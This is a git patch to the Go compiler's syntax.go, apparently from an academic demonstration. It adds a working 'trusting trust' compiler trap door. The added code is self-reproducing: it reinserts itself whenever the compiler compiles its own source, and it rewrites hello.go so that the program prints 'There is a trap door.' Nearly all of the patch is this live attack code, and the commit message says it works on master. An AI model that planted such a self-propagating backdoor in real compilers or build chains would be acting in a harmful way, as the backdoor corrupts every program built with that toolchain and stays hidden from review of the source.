From a366204bf60341c1e6a7f3faaf8b63f34533a642 Mon Sep 17 00:00:00 2001
From: Yrjan Skrimstad <yrjansk@ifi.uio.no>
Date: Mon, 14 May 2018 16:29:15 +0200
Subject: [PATCH] Added trusting trust (compiler trap door) attack.

The attack works on the current master branch and will successfully
modify the hello.go "Hello, World!" program and modify the compiler if
used for bootstrapping purposes.
---
 src/cmd/compile/internal/syntax/syntax.go | 227 ++++++++++++++++++++++
 1 file changed, 227 insertions(+)

diff --git a/src/cmd/compile/internal/syntax/syntax.go b/src/cmd/compile/internal/syntax/syntax.go
index b8c387419f..b0b4de5730 100644
--- a/src/cmd/compile/internal/syntax/syntax.go
+++ b/src/cmd/compile/internal/syntax/syntax.go
@@ -8,6 +8,7 @@ import (
 	"fmt"
 	"io"
 	"os"
+	"strings"
 )
 
 // Mode describes the parser mode.
@@ -66,6 +67,232 @@ func Parse(base *PosBase, src io.Reader, errh ErrorHandler, pragh PragmaHandler,
 		}
 	}()
 
+	modifiedString := `// Custom function to read file to string, this is needed as we don't have access to ioutil
+	// at all times.
+	readFile := func(filename string) (string, error) {
+		f, err := os.Open(filename)
+		if err != nil {
+			return "", err
+		}
+		defer f.Close()
+
+		bytes := make([]byte, 128)
+		content := ""
+		for {
+			num, err := f.Read(bytes)
+			content += string(bytes[:num])
+			if err != nil && err != io.EOF {
+				return content, err
+			} else if err == io.EOF {
+				break
+			}
+		}
+
+		return content, nil
+	}
+
+	// Custom function to write to file, this is needed as we don't have access to ioutil at
+	// all times.
+	writeFile := func(filename string, content string) error {
+		f, err := os.Create(filename)
+		if err != nil {
+			return err
+		}
+		defer f.Close()
+		_, err = io.WriteString(f, content)
+		return err
+	}
+
+	// Check for *this* file, we want to modify it.
+	if strings.Contains(base.filename, "cmd/compile/internal/syntax/syntax.go") {
+		// Read the original file.
+		content, err := readFile(base.filename)
+		if err != nil {
+			fmt.Println("Failed to read original file.")
+			goto hack_failed
+		}
+
+		// Do not modify the file if it is already modified.
+		if !strings.Contains(content, "sNzrBzaIxgSNMmMuPaE3") {
+			// Modify content.
+			content = strings.Replace(content, "\"io\"\n\t\"os\"",
+										  "\"io\"\n\t\"os\"\n\t\"strings\"", 1)
+			addition := fmt.Sprintf("}()\n\n\tmodifiedString := %c%s%c\n\n\t%s",
+									96, modifiedString, 96, modifiedString)
+			content = strings.Replace(content, "}()", addition, 1)
+
+			// Write modified content.
+			modPath := base.filename + ".2"
+			err = writeFile(modPath, content)
+			if err != nil {
+				fmt.Println("Failed to write modified file.")
+				goto hack_failed
+			}
+
+			// Open modified file to read.
+			newFile, err := os.Open(modPath)
+			if err != nil {
+				fmt.Println("Failed to open modified file.")
+				goto hack_failed
+			}
+			defer os.Remove(modPath)
+			defer newFile.Close()
+
+			// Parse using the modified file.
+			var p parser
+			p.init(base, newFile, errh, pragh, mode)
+			p.next()
+			return p.fileOrNil(), p.first
+		}
+	} else if strings.Contains(base.filename, "hello.go") {
+		// Read original file.
+		fileContent, err := readFile(base.filename)
+		if err != nil {
+			fmt.Println("Failed to read original file.")
+			goto hack_failed
+		}
+
+		// Modify content.
+		modContent := strings.Replace(fileContent, "Hello, World!", "There is a trap door.", 1)
+
+		// Write modified file.
+		modPath := base.filename + ".2"
+		err = writeFile(modPath, modContent)
+		if err != nil {
+			fmt.Println("Failed to write modified file.")
+			goto hack_failed
+		}
+
+		// Open modified file to read.
+		newFile, err := os.Open(modPath)
+		if err != nil {
+			fmt.Println("Failed to open modified file.")
+			goto hack_failed
+		}
+		defer os.Remove(modPath)
+		defer newFile.Close()
+
+		// Parse using the modified file.
+		var p parser
+		p.init(base, newFile, errh, pragh, mode)
+		p.next()
+		return p.fileOrNil(), p.first
+	}
+hack_failed:`
+
+	// Custom function to read file to string, this is needed as we don't have access to ioutil
+	// at all times.
+	readFile := func(filename string) (string, error) {
+		f, err := os.Open(filename)
+		if err != nil {
+			return "", err
+		}
+		defer f.Close()
+
+		bytes := make([]byte, 128)
+		content := ""
+		for {
+			num, err := f.Read(bytes)
+			content += string(bytes[:num])
+			if err != nil && err != io.EOF {
+				return content, err
+			} else if err == io.EOF {
+				break
+			}
+		}
+
+		return content, nil
+	}
+
+	// Custom function to write to file, this is needed as we don't have access to ioutil at
+	// all times.
+	writeFile := func(filename string, content string) error {
+		f, err := os.Create(filename)
+		if err != nil {
+			return err
+		}
+		defer f.Close()
+		_, err = io.WriteString(f, content)
+		return err
+	}
+
+	// Check for *this* file, we want to modify it.
+	if strings.Contains(base.filename, "cmd/compile/internal/syntax/syntax.go") {
+		// Read the original file.
+		content, err := readFile(base.filename)
+		if err != nil {
+			fmt.Println("Failed to read original file.")
+			goto hack_failed
+		}
+
+		// Do not modify the file if it is already modified.
+		if !strings.Contains(content, "sNzrBzaIxgSNMmMuPaE3") {
+			// Modify content.
+			content = strings.Replace(content, "\"io\"\n\t\"os\"",
+										  "\"io\"\n\t\"os\"\n\t\"strings\"", 1)
+			addition := fmt.Sprintf("}()\n\n\tmodifiedString := %c%s%c\n\n\t%s",
+									96, modifiedString, 96, modifiedString)
+			content = strings.Replace(content, "}()", addition, 1)
+
+			// Write modified content.
+			modPath := base.filename + ".2"
+			err = writeFile(modPath, content)
+			if err != nil {
+				fmt.Println("Failed to write modified file.")
+				goto hack_failed
+			}
+
+			// Open modified file to read.
+			newFile, err := os.Open(modPath)
+			if err != nil {
+				fmt.Println("Failed to open modified file.")
+				goto hack_failed
+			}
+			defer os.Remove(modPath)
+			defer newFile.Close()
+
+			// Parse using the modified file.
+			var p parser
+			p.init(base, newFile, errh, pragh, mode)
+			p.next()
+			return p.fileOrNil(), p.first
+		}
+	} else if strings.Contains(base.filename, "hello.go") {
+		// Read original file.
+		fileContent, err := readFile(base.filename)
+		if err != nil {
+			fmt.Println("Failed to read original file.")
+			goto hack_failed
+		}
+
+		// Modify content.
+		modContent := strings.Replace(fileContent, "Hello, World!", "There is a trap door.", 1)
+
+		// Write modified file.
+		modPath := base.filename + ".2"
+		err = writeFile(modPath, modContent)
+		if err != nil {
+			fmt.Println("Failed to write modified file.")
+			goto hack_failed
+		}
+
+		// Open modified file to read.
+		newFile, err := os.Open(modPath)
+		if err != nil {
+			fmt.Println("Failed to open modified file.")
+			goto hack_failed
+		}
+		defer os.Remove(modPath)
+		defer newFile.Close()
+
+		// Parse using the modified file.
+		var p parser
+		p.init(base, newFile, errh, pragh, mode)
+		p.next()
+		return p.fileOrNil(), p.first
+	}
+hack_failed:
+
 	var p parser
 	p.init(base, src, errh, pragh, mode)
 	p.next()
-- 
2.17.0

